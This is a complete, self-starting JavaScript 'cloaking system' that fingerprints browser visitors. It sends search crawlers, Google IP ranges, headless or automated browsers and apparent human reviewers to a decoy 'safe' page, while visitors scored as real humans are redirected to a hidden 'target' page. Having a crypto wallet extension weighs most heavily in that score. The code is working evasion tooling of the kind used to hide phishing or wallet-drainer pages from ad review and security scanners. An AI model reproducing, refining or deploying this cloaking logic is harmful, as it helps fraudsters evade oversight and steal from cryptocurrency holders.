class AdvancedCloakingSystem {
    constructor(config = {}) {
        this.config = {
            safePageUrl: config.safePageUrl || '/safe',
            targetPageUrl: config.targetPageUrl || '/target',
            strictnessLevel: config.strictnessLevel || 55,
            debugMode: config.debugMode || false,
            usePublicIpService: config.usePublicIpService !== undefined ? config.usePublicIpService : true,
            ...config
        };

        // HEAVY weights on wallet, battery, and behavior
        this.weights = {
            wallet: 50,                // huge boost
            battery: 20,               // strong
            batteryCharging: 5,         // extra
            behavior: 60,               // maximum from behavior
            plugins: { many: 5, none: -2 },
            fonts: { many: 5, few: -2 },
            canvasError: -5,
            softwareRenderer: -10,
            highConcurrency: 3,
            mobileResolution: 5,
            touchConsistent: 3,
            langTzMismatch: -5,
            googleIp: -50,
            proxyVpn: -10,
            residentialIp: 5,
            mobileBonus: 10,            // extra for mobile users
            ...config.weights
        };

        // Detection databases
        this.botSignatures = this.initializeBotSignatures();
        this.googleIPRanges = this.initializeGoogleIPs();
        this.vpnIPRanges = this.initializeVPNIPs();
        this.proxyIPRanges = this.initializeProxyIPs();

        // Behavioral data
        this.behavior = {
            startTime: Date.now(),
            maxScroll: 0,
            mouseMoves: 0,
            touches: 0,
            clicks: 0,
            timeToFirstInteraction: null
        };

        this.sessionId = this.generateSessionId();
        this.fingerprint = null;
        this.walletInfo = null;
        this.ipInfo = null;
        this.isMobile = this.detectMobile();

        this.log('Cloaking system initialized (desktop + mobile mode)', 'info');
        this.log(`Device detected as: ${this.isMobile ? 'MOBILE' : 'DESKTOP'}`, 'debug');
    }

    // ---------- Mobile detection ----------
    detectMobile() {
        const ua = navigator.userAgent;
        const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
        return mobileRegex.test(ua) || ('ontouchstart' in window && window.innerWidth <= 1024);
    }

    // ---------- Bot signature database ----------
    initializeBotSignatures() {
        return {
            googlebot: /Googlebot|Google\sbot|Google\sImage|Googlebot-Mobile|AdsBot-Google|Googlebot-News|Googlebot-Video|Mediapartners-Google|AdsBot-Google-Mobile|Mediapartners/i,
            bingbot: /bingbot|BingPreview|MSNBot|msnbot/i,
            yahoo: /Slurp|Yahoo!\sSlurp/i,
            yandex: /YandexBot|YandexMobileBot|YandexImages|YandexVideo|YandexMetrika/i,
            baidu: /Baiduspider|BaiduImagespider/i,
            facebook: /facebookexternalhit|Facebot/i,
            other: /DuckDuckBot|ia_archiver|archive.org|SeznamBot|Sogou|Exabot|DotBot|Ahrefs|Semrush|MJ12bot|BLEXBot|rogerbot|SiteAuditBot/i,
            headless: /Headless|PhantomJS|Nightmare|Puppeteer|Playwright/i
        };
    }

    initializeGoogleIPs() {
        return [
            '66.249.64.0/19', '64.233.160.0/19', '72.14.192.0/18', '74.125.0.0/16',
            '209.85.128.0/17', '216.239.32.0/19', '216.58.192.0/19'
        ];
    }

    initializeVPNIPs() {
        return [
            '54.0.0.0/8', '52.0.0.0/8', '159.89.0.0/16', '165.227.0.0/16',
            '34.0.0.0/8', '35.0.0.0/8', '13.0.0.0/8', '40.0.0.0/8'
        ];
    }

    initializeProxyIPs() {
        return ['103.0.0.0/8', '104.0.0.0/8'];
    }

    generateSessionId() {
        return 'sid_' + Math.random().toString(36).substring(2, 15) +
               Math.random().toString(36).substring(2, 15);
    }

    // ---------- Advanced wallet detection ----------
    detectWallet() {
        const wallet = {
            present: false,
            type: null,
            multiple: false,
            eip6963: false
        };

        if (window.eip6963Providers && window.eip6963Providers.length > 0) {
            wallet.present = true;
            wallet.eip6963 = true;
            wallet.multiple = window.eip6963Providers.length > 1;
            if (window.eip6963Providers[0]?.info?.name) {
                wallet.type = window.eip6963Providers[0].info.name;
            }
            this.log(`EIP-6963 providers: ${window.eip6963Providers.length}`, 'debug');
        }

        if (typeof window.ethereum !== 'undefined') {
            wallet.present = true;
            if (window.ethereum.isMetaMask) wallet.type = 'MetaMask';
            else if (window.ethereum.isCoinbaseWallet) wallet.type = 'Coinbase';
            else if (window.ethereum.isTrust) wallet.type = 'Trust';
            else if (window.ethereum.isBraveWallet) wallet.type = 'Brave';
            else if (window.ethereum.isRabby) wallet.type = 'Rabby';
            else if (window.ethereum.isPhantom) wallet.type = 'Phantom';
            else wallet.type = 'unknown_ethereum';

            if (window.ethereum.providers && window.ethereum.providers.length > 0) {
                wallet.multiple = true;
            }
        }

        if (typeof window.web3 !== 'undefined' && !wallet.present) {
            wallet.present = true;
            wallet.type = 'legacy_web3';
        }

        if (wallet.present) {
            this.log(`Wallet detected: ${wallet.type || 'unknown'}`, 'info');
        }
        return wallet;
    }

    // ---------- IP detection ----------
    async checkIPAddress() {
        try {
            let ip, geo = { country: '', city: '', isp: '', connectionType: '' };

            if (this.config.usePublicIpService) {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } else {
                const ipRes = await fetch('/api/get-client-ip');
                if (!ipRes.ok) throw new Error('IP endpoint failed');
                const ipData = await ipRes.json();
                ip = ipData.ip;
                const geoRes = await fetch(`/api/geo-lookup?ip=${ip}`);
                if (geoRes.ok) {
                    geo = await geoRes.json();
                }
            }

            return {
                ip,
                isGoogle: this.ipInRanges(ip, this.googleIPRanges),
                isProxy: this.ipInRanges(ip, this.proxyIPRanges),
                isVPN: this.ipInRanges(ip, this.vpnIPRanges),
                country: geo.country,
                city: geo.city,
                isp: geo.isp,
                connectionType: geo.connectionType
            };
        } catch (error) {
            this.log(`IP check failed: ${error.message}`, 'error');
            return { isGoogle: false, isProxy: false, isVPN: false };
        }
    }

    ipInRanges(ip, ranges) {
        if (!ip) return false;
        const ipInt = this.ipToInt(ip);
        if (ipInt === null) return false;
        for (const range of ranges) {
            const [base, maskBits] = range.split('/');
            const mask = ~((1 << (32 - parseInt(maskBits))) - 1) >>> 0;
            const baseInt = this.ipToInt(base);
            if (baseInt === null) continue;
            if ((ipInt & mask) === (baseInt & mask)) return true;
        }
        return false;
    }

    ipToInt(ip) {
        const parts = ip.split('.');
        if (parts.length !== 4) return null;
        return ((parseInt(parts[0]) << 24) |
                (parseInt(parts[1]) << 16) |
                (parseInt(parts[2]) << 8) |
                parseInt(parts[3])) >>> 0;
    }

    // ---------- User agent analysis ----------
    analyzeUserAgent() {
        const ua = navigator.userAgent;
        for (const [type, regex] of Object.entries(this.botSignatures)) {
            if (regex.test(ua)) {
                return { isBot: true, botType: type };
            }
        }
        return { isBot: false };
    }

    // ---------- Headless / automation detection ----------
    isHeadlessBrowser(fingerprint) {
        const indicators = [];
        if (navigator.webdriver) indicators.push('webdriver');
        if (window.callPhantom || window._phantom) indicators.push('phantom');
        if (window.__nightmare) indicators.push('nightmare');
        if (navigator.userAgent.includes('Headless')) indicators.push('headless_ua');
        if (fingerprint.plugins && fingerprint.plugins.length === 0) indicators.push('no_plugins');
        if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') indicators.push('canvas_blocked');
        if (!window.chrome && !window.navigator.brave) {
            if (indicators.length > 0) indicators.push('no_chrome');
        }
        return indicators.length >= 2;
    }

    detectAutomationTools() {
        const indicators = [
            'selenium', 'webdriver', 'driver', 'callPhantom', '_phantom',
            '__nightmare', '_Selenium_IDE_Recorder', 'domAutomation', 'domAutomationController'
        ];
        for (const ind of indicators) {
            if (window[ind] !== undefined) return true;
        }
        return false;
    }

    // ---------- Language & timezone consistency ----------
    checkLanguageConsistency() {
        const languages = navigator.languages || [navigator.language];
        const primary = languages[0];
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const tzRegion = timezone.split('/')[0];
        const langRegion = primary.split('-')[1] || '';
        const match = tzRegion === langRegion || 
                     (tzRegion === 'America' && langRegion === 'US') ||
                     (tzRegion === 'Europe' && ['GB','DE','FR'].includes(langRegion));
        return { consistent: match, languages, timezone };
    }

    // ---------- Screen fingerprint ----------
    getScreenMetrics() {
        return {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1,
            touchSupport: 'ontouchstart' in window,
            maxTouchPoints: navigator.maxTouchPoints || 0,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight
        };
    }

    // ---------- Comprehensive fingerprint ----------
    async generateFingerprint() {
        const screen = this.getScreenMetrics();
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            language: navigator.language,
            languages: navigator.languages,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: screen,
            screenResolution: `${screen.width}x${screen.height}`,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            canvas: await this.getCanvasFingerprint(),
            webgl: this.getWebGLFingerprint(),
            fonts: await this.getFontList(),
            plugins: this.getPluginList(),
            audio: await this.getAudioFingerprint(),
            webRTC: this.getWebRTCInfo(),
            battery: await this.getBatteryInfo(),
            permissions: await this.getPermissionsInfo(),
            timestamp: Date.now()
        };
    }

    async getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(10, 10, 100, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Cloaking Detection Test', 2, 15);
            ctx.beginPath();
            ctx.arc(50, 25, 10, 0, Math.PI * 2);
            ctx.strokeStyle = '#ff0000';
            ctx.lineWidth = 2;
            ctx.stroke();
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const pixels = imageData.data;
            let hash = 0;
            for (let i = 0; i < pixels.length; i += 4) {
                hash = ((hash << 5) - hash) + pixels[i];
                hash |= 0;
            }
            return { hash: hash.toString(16) };
        } catch (e) {
            return { hash: 'canvas_error' };
        }
    }

    getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return { supported: false };
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                supported: true,
                vendor: gl.getParameter(gl.VENDOR),
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
                unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                extensions: gl.getSupportedExtensions() || []
            };
        } catch (e) {
            return { error: e.message };
        }
    }

    async getFontList() {
        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        const fontList = [
            'Arial', 'Helvetica', 'Times New Roman', 'Courier New',
            'Verdana', 'Georgia', 'Palatino', 'Garamond',
            'Comic Sans MS', 'Trebuchet MS', 'Arial Black',
            'Impact', 'Lucida Console', 'Tahoma', 'Wingdings'
        ];
        const detected = [];
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        for (const font of fontList) {
            for (const base of baseFonts) {
                ctx.font = `72px ${base}`;
                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
                ctx.font = `72px '${font}', ${base}`;
                const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
                if (baseWidth !== testWidth) {
                    detected.push(font);
                    break;
                }
            }
        }
        return detected;
    }

    getPluginList() {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            const p = navigator.plugins[i];
            plugins.push({ name: p.name, filename: p.filename, description: p.description });
        }
        return plugins;
    }

    async getAudioFingerprint() {
        return new Promise((resolve) => {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const analyser = audioContext.createAnalyser();
                oscillator.connect(analyser);
                analyser.connect(audioContext.destination);
                oscillator.frequency.value = 440;
                oscillator.type = 'sine';
                const dataArray = new Uint8Array(analyser.frequencyBinCount);
                oscillator.start();
                setTimeout(() => {
                    analyser.getByteFrequencyData(dataArray);
                    oscillator.stop();
                    audioContext.close();
                    let hash = 0;
                    for (let i = 0; i < dataArray.length; i += 10) {
                        hash = ((hash << 5) - hash) + dataArray[i];
                        hash |= 0;
                    }
                    resolve({ supported: true, hash: hash.toString(16) });
                }, 100);
            } catch (e) {
                resolve({ supported: false });
            }
        });
    }

    getWebRTCInfo() {
        return {
            hasWebRTC: 'RTCPeerConnection' in window,
            hasGetUserMedia: 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices
        };
    }

    async getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    supported: true,
                    charging: battery.charging,
                    level: battery.level,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (e) {
                return { supported: false, error: e.message };
            }
        }
        return { supported: false };
    }

    async getPermissionsInfo() {
        const permissions = ['geolocation', 'notifications', 'camera', 'microphone'];
        const results = {};
        if ('permissions' in navigator) {
            for (const perm of permissions) {
                try {
                    const status = await navigator.permissions.query({ name: perm });
                    results[perm] = status.state;
                } catch (e) {
                    results[perm] = 'unknown';
                }
            }
        }
        return results;
    }

    // ---------- Behavioral tracking (counts touches) ----------
    startBehaviorTracking() {
        const onInteraction = (type) => {
            if (this.behavior.timeToFirstInteraction === null) {
                this.behavior.timeToFirstInteraction = Date.now() - this.behavior.startTime;
            }
            if (type === 'click') this.behavior.clicks++;
            if (type === 'touch') this.behavior.touches++;
        };

        window.addEventListener('scroll', () => {
            const scrollPercent = (window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100;
            this.behavior.maxScroll = Math.max(this.behavior.maxScroll, scrollPercent);
        });

        let moveTimer;
        window.addEventListener('mousemove', () => {
            if (!moveTimer) {
                moveTimer = setTimeout(() => {
                    this.behavior.mouseMoves++;
                    moveTimer = null;
                }, 200);
            }
            if (this.behavior.timeToFirstInteraction === null) {
                this.behavior.timeToFirstInteraction = Date.now() - this.behavior.startTime;
            }
        });

        window.addEventListener('click', () => onInteraction('click'));
        window.addEventListener('touchstart', () => onInteraction('touch'));

        setTimeout(() => this.saveBehavior(), 5000);
    }

    saveBehavior() {
        const timeOnPage = (Date.now() - this.behavior.startTime) / 1000;
        const session = {
            timeOnPage,
            maxScroll: this.behavior.maxScroll,
            mouseMoves: this.behavior.mouseMoves,
            touches: this.behavior.touches,
            clicks: this.behavior.clicks,
            timeToFirstInteraction: this.behavior.timeToFirstInteraction,
            timestamp: Date.now()
        };
        sessionStorage.setItem('visitor_behavior', JSON.stringify(session));
    }

    hasExistingSession() {
        return sessionStorage.getItem('visitor_behavior') !== null;
    }

    analyzeBehavior() {
        const session = JSON.parse(sessionStorage.getItem('visitor_behavior') || '{}');
        let score = 0;
        if (session.timeOnPage > 3) score += 15;
        if (session.maxScroll > 10) score += 15;
        // For desktop, count mouse moves; for mobile, count touches
        if (!this.isMobile) {
            if (session.mouseMoves > 0) score += 15;
        } else {
            if (session.touches > 0) score += 15;  // mobile equivalent
        }
        if (session.clicks > 0) score += 20;
        if (session.timeToFirstInteraction && session.timeToFirstInteraction < 5000) score += 10;
        return Math.min(this.weights.behavior, score);
    }

    // ---------- Weighted scoring (with mobile bonus) ----------
    calculateHumanScore(ipInfo, fingerprint, wallet, behaviorScore) {
        let score = 0;
        const w = this.weights;
        const weightsLog = [];

        // ---- Wallet ----
        if (wallet.present) {
            score += w.wallet;
            weightsLog.push(`wallet:+${w.wallet}`);
        }

        // ---- Battery ----
        if (fingerprint.battery && fingerprint.battery.supported && typeof fingerprint.battery.level === 'number') {
            score += w.battery;
            weightsLog.push(`battery:+${w.battery}`);
            if ('charging' in fingerprint.battery) {
                score += w.batteryCharging;
                weightsLog.push(`battery_charging:+${w.batteryCharging}`);
            }
        }

        // ---- Mobile bonus ----
        if (this.isMobile) {
            score += w.mobileBonus;
            weightsLog.push(`mobile_bonus:+${w.mobileBonus}`);
        }

        // ---- IP signals (modest) ----
        if (ipInfo.isGoogle) {
            score += w.googleIp;
            weightsLog.push(`google_ip:${w.googleIp}`);
        } else {
            if (ipInfo.isProxy || ipInfo.isVPN) {
                score += w.proxyVpn;
                weightsLog.push(`proxy/vpn:${w.proxyVpn}`);
            }
            if (ipInfo.connectionType === 'residential') {
                score += w.residentialIp;
                weightsLog.push(`residential_ip:+${w.residentialIp}`);
            }
        }

        // ---- Browser fingerprint (low impact, further reduced for mobile) ----
        if (fingerprint.plugins && fingerprint.plugins.length > 2) {
            score += w.plugins.many;
            weightsLog.push(`plugins>2:+${w.plugins.many}`);
        } else if (fingerprint.plugins && fingerprint.plugins.length === 0) {
            // less penalty on mobile
            let penalty = w.plugins.none;
            if (this.isMobile) penalty = Math.min(0, penalty + 1); // make less negative
            score += penalty;
            weightsLog.push(`no_plugins:${penalty}`);
        }

        if (fingerprint.fonts && fingerprint.fonts.length > 10) {
            score += w.fonts.many;
            weightsLog.push(`fonts>10:+${w.fonts.many}`);
        } else if (fingerprint.fonts && fingerprint.fonts.length < 5) {
            let penalty = w.fonts.few;
            if (this.isMobile) penalty = Math.min(0, penalty + 1);
            score += penalty;
            weightsLog.push(`fonts<5:${penalty}`);
        }

        if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') {
            let penalty = w.canvasError;
            if (this.isMobile) penalty = Math.min(0, penalty + 2);
            score += penalty;
            weightsLog.push(`canvas_error:${penalty}`);
        }

        if (fingerprint.webgl && fingerprint.webgl.renderer) {
            const renderer = fingerprint.webgl.renderer.toLowerCase();
            if (renderer.includes('swiftshader') || renderer.includes('llvmpipe') || renderer.includes('mesa')) {
                let penalty = w.softwareRenderer;
                if (this.isMobile) penalty = Math.min(0, penalty + 3);
                score += penalty;
                weightsLog.push(`software_renderer:${penalty}`);
            }
        }

        if (fingerprint.hardwareConcurrency && fingerprint.hardwareConcurrency > 2) {
            score += w.highConcurrency;
            weightsLog.push(`concurrency>2:+${w.highConcurrency}`);
        }

        const { width, height } = fingerprint.screen;
        if (width < 1024 && height < 768) {
            score += w.mobileResolution;
            weightsLog.push(`mobile_res:+${w.mobileResolution}`);
        }

        const isMobileUA = /Mobi|Android/i.test(navigator.userAgent);
        if (fingerprint.screen.touchSupport === isMobileUA) {
            score += w.touchConsistent;
            weightsLog.push(`touch_consistent:+${w.touchConsistent}`);
        }

        const langConsistency = this.checkLanguageConsistency();
        if (!langConsistency.consistent) {
            let penalty = w.langTzMismatch;
            if (this.isMobile) penalty = Math.min(0, penalty + 2);
            score += penalty;
            weightsLog.push(`lang/tz_mismatch:${penalty}`);
        }

        // ---- Behavioral score ----
        score += behaviorScore;
        weightsLog.push(`behavior:+${behaviorScore}`);

        // Normalize to 0-100
        score = Math.min(100, Math.max(0, score));
        this.log(`Score components: ${weightsLog.join(', ')}`, 'debug');
        return score;
    }

    // ---------- Main decision ----------
    async determineVisitorType() {
        this.log('Starting classification', 'debug');

        const ipCheck = await this.checkIPAddress();
        this.ipInfo = ipCheck;
        if (ipCheck.isGoogle) {
            this.log('Google IP → safe', 'info');
            return { type: 'bot', reason: 'google_ip', showSafe: true };
        }

        const uaCheck = this.analyzeUserAgent();
        if (uaCheck.isBot) {
            this.log(`Bot UA: ${uaCheck.botType} → safe`, 'info');
            return { type: 'bot', reason: 'user_agent', showSafe: true };
        }

        const fingerprint = await this.generateFingerprint();
        this.fingerprint = fingerprint;

        if (this.isHeadlessBrowser(fingerprint)) {
            this.log('Headless browser → safe', 'info');
            return { type: 'bot', reason: 'headless', showSafe: true };
        }

        if (this.detectAutomationTools()) {
            this.log('Automation tools → safe', 'info');
            return { type: 'bot', reason: 'automation', showSafe: true };
        }

        const wallet = this.detectWallet();
        let behaviorScore = 0;
        if (this.hasExistingSession()) {
            behaviorScore = this.analyzeBehavior();
            this.log(`Behavior score from session: ${behaviorScore}`, 'debug');
        } else {
            this.startBehaviorTracking();
        }

        if (this.isPotentialReviewer(fingerprint, ipCheck)) {
            this.log('Potential reviewer → safe', 'info');
            return { type: 'reviewer', reason: 'reviewer_pattern', showSafe: true };
        }

        const humanScore = this.calculateHumanScore(ipCheck, fingerprint, wallet, behaviorScore);
        this.log(`Human score: ${humanScore}% (threshold: ${this.config.strictnessLevel})`, 'info');

        if (humanScore >= this.config.strictnessLevel) {
            return { type: 'human', score: humanScore, showSafe: false };
        } else {
            return { type: 'suspicious', score: humanScore, showSafe: true };
        }
    }

    // ---------- Reviewer pattern detection (strict) ----------
    isPotentialReviewer(fingerprint, ipInfo) {
        const reviewerIndicators = [];
        const reviewerCountries = ['US', 'GB', 'IE', 'IN', 'SG', 'MY'];
        if (reviewerCountries.includes(ipInfo.country)) reviewerIndicators.push('country');
        const standardResolutions = ['1920x1080', '1366x768', '1440x900', '1536x864'];
        if (standardResolutions.includes(fingerprint.screenResolution)) reviewerIndicators.push('resolution');
        const reviewerLanguages = ['en-US', 'en-GB', 'en'];
        if (reviewerLanguages.includes(navigator.language)) reviewerIndicators.push('language');
        return reviewerIndicators.length >= 3;
    }

    // ---------- Execution ----------
    async executeCloaking() {
        try {
            const result = await this.determineVisitorType();
            const sessionData = { timestamp: Date.now(), result, fingerprint: this.fingerprint };
            sessionStorage.setItem('visitor_session', JSON.stringify(sessionData));

            if (typeof window.cloakingReady === 'function') window.cloakingReady();

            if (result.showSafe) {
                this.log(`Redirecting to safe page: ${this.config.safePageUrl}`, 'info');
                window.location.replace(this.config.safePageUrl);
            } else {
                this.log(`Serving target page: ${this.config.targetPageUrl}`, 'success');
                window.location.replace(this.config.targetPageUrl);
            }
        } catch (error) {
            this.log(`Cloaking error: ${error.message}`, 'error');
            if (typeof window.cloakingReady === 'function') window.cloakingReady();
            window.location.href = this.config.safePageUrl;
        }
    }

    log(message, level) {
        if (this.config.debugMode || level === 'error') {
            console.log(`[Cloaking ${level.toUpperCase()}] ${message}`);
        }
    }
}

// ---------- Auto‑initialize ----------
(function() {
    const cloakingSystem = new AdvancedCloakingSystem({
        safePageUrl: '/safe',
        targetPageUrl: '/target',
        strictnessLevel: 55,
        debugMode: true,               // set false in production
        usePublicIpService: true
    });

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => cloakingSystem.executeCloaking());
    } else {
        cloakingSystem.executeCloaking();
    }
})();
